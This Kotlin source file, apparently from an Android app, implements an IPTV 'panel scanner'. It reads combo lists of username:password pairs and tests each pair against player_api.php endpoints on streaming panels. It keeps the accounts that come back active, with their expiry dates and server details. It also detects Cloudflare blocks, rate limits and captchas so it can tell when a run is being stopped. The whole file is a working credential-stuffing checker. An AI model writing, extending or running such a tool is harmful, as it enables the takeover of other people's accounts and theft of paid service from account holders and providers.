package com.alibaba.data.service

import com.alibaba.domain.model.*
import com.alibaba.domain.service.PanelScanner
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import javax.inject.Inject

class PanelScannerImpl @Inject constructor(
    private val okHttpClient: OkHttpClient
) : PanelScanner {

    override suspend fun parseComboFile(content: String): List<ComboAccount> = withContext(Dispatchers.Default) {
        val accounts = mutableListOf<ComboAccount>()
        
        content.lines().forEach { line ->
            val trimmed = line.trim()
            
            // Skip empty lines and comments
            if (trimmed.isEmpty() || trimmed.startsWith("#")) {
                return@forEach
            }
            
            // Parse username:password format
            if (trimmed.contains(":")) {
                val parts = trimmed.split(":", limit = 2)
                if (parts.size == 2) {
                    val username = parts[0].trim()
                    val password = parts[1].trim()
                    
                    // Validate
                    if (username.isNotEmpty() && password.isNotEmpty() && username.length < 100 && password.length < 100) {
                        accounts.add(ComboAccount(username, password))
                    }
                }
            }
        }
        
        accounts.distinct()
    }

    override suspend fun scanAccount(account: ComboAccount, panel: PanelInfo): PanelScanResult = withContext(Dispatchers.IO) {
        try {
            // Build API URL - Python script format: http://panel:port/player_api.php?username=X&password=Y
            val apiUrl = "http://${panel.fullAddress}/player_api.php?username=${account.username}&password=${account.password}"
            
            val request = Request.Builder()
                .url(apiUrl)
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                .header("Accept", "application/json")
                .header("Accept-Language", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7")
                .header("Connection", "keep-alive")
                .build()

            val response = withTimeoutOrNull(10_000) {
                okHttpClient.newCall(request).execute()
            }

            if (response == null) {
                return@withContext PanelScanResult(
                    account = account,
                    panel = panel,
                    status = ScanStatus.Error("Timeout")
                )
            }

            response.use {
                val statusCode = it.code
                val responseBody = it.body?.string() ?: ""

                // Ban detection - Python script patterns
                val banPatterns = listOf(
                    "cloudflare", "access denied", "ip banned", "blocked",
                    "rate limit", "too many requests", "403 forbidden",
                    "captcha", "security challenge", "ddos protection"
                )
                
                val lowerBody = responseBody.lowercase()
                val isBanned = banPatterns.any { pattern -> lowerBody.contains(pattern) } || statusCode in listOf(403, 429, 503)

                if (isBanned) {
                    return@withContext PanelScanResult(
                        account = account,
                        panel = panel,
                        status = ScanStatus.Banned
                    )
                }

                // Success - Parse JSON response
                if (statusCode == 200 && responseBody.isNotEmpty()) {
                    try {
                        val json = JSONObject(responseBody)
                        
                        // Check if user_info exists and status is Active
                        if (json.has("user_info")) {
                            val userInfo = json.getJSONObject("user_info")
                            val status = userInfo.optString("status", "")
                            
                            if (status.equals("Active", ignoreCase = true)) {
                                // Parse user info
                                val expTimestamp = userInfo.optLong("exp_date", 0)
                                val expDate = if (expTimestamp > 0) {
                                    java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
                                        .format(java.util.Date(expTimestamp * 1000))
                                } else {
                                    "Sınırsız"
                                }
                                
                                val parsedUserInfo = UserInfo(
                                    username = account.username,
                                    password = account.password,
                                    status = status,
                                    expDate = expDate,
                                    activeCons = userInfo.optInt("active_cons", 0),
                                    maxConnections = userInfo.optInt("max_connections", 1),
                                    isTrial = userInfo.optInt("is_trial", 0) == 1,
                                    createdAt = userInfo.optString("created_at", null)
                                )
                                
                                // Parse server info
                                val parsedServerInfo = if (json.has("server_info")) {
                                    val serverInfo = json.getJSONObject("server_info")
                                    ServerInfo(
                                        url = serverInfo.optString("url", ""),
                                        port = serverInfo.optString("port", ""),
                                        httpsPort = serverInfo.optString("https_port", null),
                                        serverProtocol = serverInfo.optString("server_protocol", null),
                                        rtmpPort = serverInfo.optString("rtmp_port", null),
                                        timezone = serverInfo.optString("timezone", null)
                                    )
                                } else {
                                    null
                                }
                                
                                // Estimate channel count (would need separate API call for exact count)
                                val channelCount = 0 // Can be fetched from M3U URL if needed
                                
                                return@withContext PanelScanResult(
                                    account = account,
                                    panel = panel,
                                    status = ScanStatus.Valid(channelCount),
                                    userInfo = parsedUserInfo,
                                    serverInfo = parsedServerInfo
                                )
                            }
                        }
                        
                        // Invalid account
                        return@withContext PanelScanResult(
                            account = account,
                            panel = panel,
                            status = ScanStatus.Invalid
                        )
                        
                    } catch (e: Exception) {
                        return@withContext PanelScanResult(
                            account = account,
                            panel = panel,
                            status = ScanStatus.Error("JSON parse error: ${e.message}")
                        )
                    }
                }

                // Other error
                return@withContext PanelScanResult(
                    account = account,
                    panel = panel,
                    status = ScanStatus.Error("HTTP $statusCode")
                )
            }
        } catch (e: Exception) {
            return@withContext PanelScanResult(
                account = account,
                panel = panel,
                status = ScanStatus.Error(e.message ?: "Unknown error")
            )
        }
    }
}
